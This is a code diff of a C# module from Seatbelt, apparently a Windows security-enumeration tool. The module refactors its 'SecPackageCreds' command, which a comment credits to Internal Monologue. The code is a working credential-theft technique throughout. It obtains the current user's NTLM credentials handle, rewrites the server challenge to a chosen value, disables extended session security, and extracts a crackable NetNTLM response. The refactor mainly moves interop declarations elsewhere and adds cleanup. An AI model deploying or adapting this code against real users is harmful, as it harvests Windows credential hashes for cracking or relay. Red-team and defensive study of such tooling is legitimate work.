@@ -1,15 +1,13 @@
-﻿using Microsoft.Win32;
-using Seatbelt.Output.Formatters;
-using Seatbelt.Output.TextWriters;
-using Seatbelt.Util;
+﻿using Seatbelt.Util;
 using System;
 using System.Collections.Generic;
-using System.Runtime.InteropServices;
-using System.Security.Principal;
 using System.Text;
+using Seatbelt.Interop;
+using static Seatbelt.Interop.Secur32;
 
 namespace Seatbelt.Commands.Windows.SecurityPackageCredentials
 {
+    // Heavily based on code from Internal Monologue - https://github.com/eladshamir/Internal-Monologue/blob/85134e4ebe5ea9e7f6b39d4b4ad467e40a0c9eca/InternalMonologue/InternalMonologue.cs#L465-L827
     internal class SecPackageCredsCommand : CommandBase
     {
         public override string Command => "SecPackageCreds";
@@ -17,6 +15,12 @@ namespace Seatbelt.Commands.Windows.SecurityPackageCredentials
         public override CommandGroup[] Group => new[] { CommandGroup.User };
         public override bool SupportRemote => false;
         public Runtime ThisRunTime;
+
+        private const int MAX_TOKEN_SIZE = 12288;
+        private const uint SEC_E_OK = 0;
+        private const uint SEC_E_NO_CREDENTIALS = 0x8009030e;
+        private const uint SEC_I_CONTINUE_NEEDED = 0x90312;
+
 
         public SecPackageCredsCommand(Runtime runtime) : base(runtime)
         {
@@ -29,194 +33,149 @@ namespace Seatbelt.Commands.Windows.SecurityPackageCredentials
             if (args.Length > 0)
                 challenge = args[0];
 
-            return InternalMonologueForCurrentUser(challenge, true);
+            yield return GetNtlmCreds(challenge, true);
         }
 
-        struct SECURITY_INTEGER
-        {
-            public uint LowPart;
-            public int HighPart;
-        };
-
-        struct SECURITY_HANDLE
-        {
-            public IntPtr LowPart;
-            public IntPtr HighPart;
-        };
-
-        private const int MAX_TOKEN_SIZE = 12288;
-        private const uint SEC_E_OK = 0;
-        private const uint SEC_E_NO_CREDENTIALS = 0x8009030e;
-        private const uint SEC_I_CONTINUE_NEEDED = 0x90312;
-
-        [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
-        static extern uint AcquireCredentialsHandle(
-            IntPtr pszPrincipal,
-            string pszPackage,
-            int fCredentialUse,
-            IntPtr PAuthenticationID,
-            IntPtr pAuthData,
-            int pGetKeyFn,
-            IntPtr pvGetKeyArgument,
-            ref SECURITY_HANDLE phCredential,
-            ref SECURITY_INTEGER ptsExpiry);
-
-        [DllImport("secur32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-        static extern uint InitializeSecurityContext(
-            ref SECURITY_HANDLE phCredential,
-            IntPtr phContext,
-            IntPtr pszTargetName,
-            int fContextReq,
-            int Reserved1,
-            int TargetDataRep,
-            IntPtr pInput,
-            int Reserved2,
-            out SECURITY_HANDLE phNewContext,
-            out SecBufferDesc pOutput,
-            out uint pfContextAttr,
-            out SECURITY_INTEGER ptsExpiry);
-
-        [DllImport("secur32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-        static extern uint InitializeSecurityContext(
-            ref SECURITY_HANDLE phCredential,
-            ref SECURITY_HANDLE phContext,
-            IntPtr pszTargetName,
-            int fContextReq,
-            int Reserved1,
-            int TargetDataRep,
-            ref SecBufferDesc SecBufferDesc,
-            int Reserved2,
-            out SECURITY_HANDLE phNewContext,
-            out SecBufferDesc pOutput,
-            out uint pfContextAttr,
-            out SECURITY_INTEGER ptsExpiry);
-
-        [DllImport("secur32.dll", SetLastError = true)]
-        static extern uint AcceptSecurityContext(
-            ref SECURITY_HANDLE phCredential,
-            IntPtr phContext,
-            ref SecBufferDesc pInput,
-            uint fContextReq,
-            uint TargetDataRep,
-            out SECURITY_HANDLE phNewContext,
-            out SecBufferDesc pOutput,
-            out uint pfContextAttr,
-            out SECURITY_INTEGER ptsTimeStamp);
-
-        private IEnumerable<CommandDTOBase?> InternalMonologueForCurrentUser(string challenge, bool DisableESS)
+        private NtlmHashDTO? GetNtlmCreds(string challenge, bool DisableESS)
         {
             var clientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
+            var newClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
             var serverToken = new SecBufferDesc(MAX_TOKEN_SIZE);
 
-            SECURITY_HANDLE hCred;
-            hCred.LowPart = hCred.HighPart = IntPtr.Zero;
+            SECURITY_HANDLE cred;
+            cred.LowPart = cred.HighPart = IntPtr.Zero;
+
+            SECURITY_HANDLE clientContext;
+            clientContext.LowPart = clientContext.HighPart = IntPtr.Zero;
+
+            SECURITY_HANDLE newClientContext;
+            newClientContext.LowPart = newClientContext.HighPart = IntPtr.Zero;
+
+            SECURITY_HANDLE serverContext;
+            serverContext.LowPart = serverContext.HighPart = IntPtr.Zero;
 
             SECURITY_INTEGER clientLifeTime;
-            clientLifeTime.LowPart = 0;
-            clientLifeTime.HighPart = 0;
+            clientLifeTime.LowPart = clientLifeTime.HighPart = IntPtr.Zero;
 
-            // Acquire credentials handle for current user
-            var result = AcquireCredentialsHandle(
-                IntPtr.Zero,
-                "NTLM",
-                3,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                0,
-                IntPtr.Zero,
-                ref hCred,
-                ref clientLifeTime
-            );
-            if (result != SEC_E_OK)
-                throw new Exception($"AcquireCredentialsHandle failed. Error: 0x{result:x8}");
-
-            // Get a type-1 message from NTLM SSP
-            result = InitializeSecurityContext(
-                ref hCred,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                0x00000800,
-                0,
-                0x10,
-                IntPtr.Zero,
-                0,
-                out var clientContext,
-                out clientToken,
-                out _,
-                out clientLifeTime
-            );
-            if (result != SEC_E_OK && result != SEC_I_CONTINUE_NEEDED)
-                throw new Exception($"InitializeSecurityContext failed. Error: 0x{result:x8}");
-
-            // Get a type-2 message from NTLM SSP (Server)
-            result = AcceptSecurityContext(
-                ref hCred,
-                IntPtr.Zero,
-                ref clientToken,
-                0x00000800,
-                0x10,
-                out _,
-                out serverToken,
-                out _,
-                out clientLifeTime
+            try
+            {
+                // Acquire credentials handle for current user
+                var result = Secur32.AcquireCredentialsHandle(
+                    IntPtr.Zero,
+                    "NTLM",
+                    3,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    0,
+                    IntPtr.Zero,
+                    ref cred,
+                    ref clientLifeTime
                 );
-            if (result != SEC_E_OK && result != SEC_I_CONTINUE_NEEDED)
-                throw new Exception($"AcceptSecurityContext failed. Error: 0x{result:x8}");
+                if (result != SEC_E_OK)
+                    throw new Exception($"AcquireCredentialsHandle failed. Error: 0x{result:x8}");
 
-            // Tamper with the CHALLENGE message
-            var serverMessage = serverToken.ToArray();
-            var challengeBytes = StringToByteArray(challenge);
-            if (DisableESS)
-            {
-                serverMessage[22] = (byte)(serverMessage[22] & 0xF7);
-            }
-
-            //Replace Challenge
-            Array.Copy(challengeBytes, 0, serverMessage, 24, 8);
-            //Reset reserved bytes to avoid local authentication
-            Array.Copy(new byte[16], 0, serverMessage, 32, 16);
-
-            clientToken.Dispose();
-            serverToken.Dispose();
-            serverToken = new SecBufferDesc(serverMessage);
-            clientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
-
-            result = InitializeSecurityContext(
-                ref hCred,
-                ref clientContext,
-                IntPtr.Zero,
-                0x00000800,
-                0,
-                0x10,
-                ref serverToken,
-                0,
-                out clientContext,
-                out clientToken,
-                out _,
-                out clientLifeTime
+                // Get a type-1 message from NTLM SSP
+                result = Secur32.InitializeSecurityContext(
+                    ref cred,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    0x00000800,         // SECPKG_FLAG_NEGOTIABLE
+                    0,
+                    0x10,             // SECURITY_NATIVE_DREP
+                    IntPtr.Zero,
+                    0,
+                    out clientContext,
+                    out clientToken,
+                    out _,
+                    out clientLifeTime
                 );
+                if (result != SEC_E_OK && result != SEC_I_CONTINUE_NEEDED)
+                    throw new Exception($"InitializeSecurityContext failed. Error: 0x{result:x8}");
 
-            var clientTokenBytes = clientToken.ToArray();
-            clientToken.Dispose();
-            serverToken.Dispose();
+                // Get a type-2 message from NTLM SSP (Server)
+                result = AcceptSecurityContext(
+                    ref cred,
+                    IntPtr.Zero,
+                    ref clientToken,
+                    0x00000800,     // ASC_REQ_CONNECTION
+                    0x10,         // SECURITY_NATIVE_DREP
+                    out serverContext,
+                    out serverToken,
+                    out _,
+                    out clientLifeTime
+                    );
+                if (result != SEC_E_OK && result != SEC_I_CONTINUE_NEEDED)
+                    throw new Exception($"AcceptSecurityContext failed. Error: 0x{result:x8}");
 
-            if (result == SEC_E_OK)
-                yield return ParseNTResponse(clientTokenBytes, challenge);
-            else if (result == SEC_E_NO_CREDENTIALS)
-            {
-                WriteError("The security package does not contain any credentials");
-                yield break;
-            }
-            else if (DisableESS)
-            {
-                var resp = InternalMonologueForCurrentUser(challenge, false);
-                foreach (var r in resp)
+                // Tamper with the CHALLENGE message
+                var serverMessage = serverToken.ToArray();
+                var challengeBytes = StringToByteArray(challenge);
+                if (DisableESS)
                 {
-                    yield return r;
+                    serverMessage[22] = (byte)(serverMessage[22] & 0xF7);
                 }
+
+                //Replace Challenge
+                Array.Copy(challengeBytes, 0, serverMessage, 24, 8);
+                //Reset reserved bytes to avoid local authentication
+                Array.Copy(new byte[16], 0, serverMessage, 32, 16);
+
+                
+                var newServerToken = new SecBufferDesc(serverMessage);
+                result = InitializeSecurityContext(
+                    ref cred,
+                    ref clientContext,
+                    IntPtr.Zero,
+                    0x00000800,       // SECPKG_FLAG_NEGOTIABLE
+                    0,
+                    0x10,           // SECURITY_NATIVE_DREP
+                    ref newServerToken,
+                    0,
+                    out newClientContext,
+                    out newClientToken,
+                    out _,
+                    out clientLifeTime
+                    );
+
+                var clientTokenBytes = newClientToken.ToArray();
+                newServerToken.Dispose();
+
+                if (result == SEC_E_OK)
+                    return ParseNTResponse(clientTokenBytes, challenge);
+                else if (result == SEC_E_NO_CREDENTIALS)
+                {
+                    WriteVerbose("The NTLM security package does not contain any credentials");
+                    return null;
+                }
+                else if (DisableESS)
+                {
+                    return GetNtlmCreds(challenge, false);
+                }
+                else
+                    throw new Exception($"InitializeSecurityContext (client) failed. Error: 0x{result:x8}");
             }
-            else
-                throw new Exception($"InitializeSecurityContext (client) failed. Error: 0x{result:x8}");
+            catch (Exception e)
+            {
+                throw e;
+            }
+            finally
+            {
+                clientToken.Dispose();
+                newClientToken.Dispose();
+                serverToken.Dispose();
+
+                if (cred.LowPart != IntPtr.Zero && cred.HighPart != IntPtr.Zero)
+                    FreeCredentialsHandle(ref cred);
+
+                if (clientContext.LowPart != IntPtr.Zero && clientContext.HighPart != IntPtr.Zero)
+                    DeleteSecurityContext(ref clientContext);
+
+                if (newClientContext.LowPart != IntPtr.Zero && newClientContext.HighPart != IntPtr.Zero)
+                    DeleteSecurityContext(ref newClientContext);
+
+                if (serverContext.LowPart != IntPtr.Zero && serverContext.HighPart != IntPtr.Zero)
+                    DeleteSecurityContext(ref serverContext);
+            }
         }
 
         //This function parses the NetNTLM response from a type-3 message
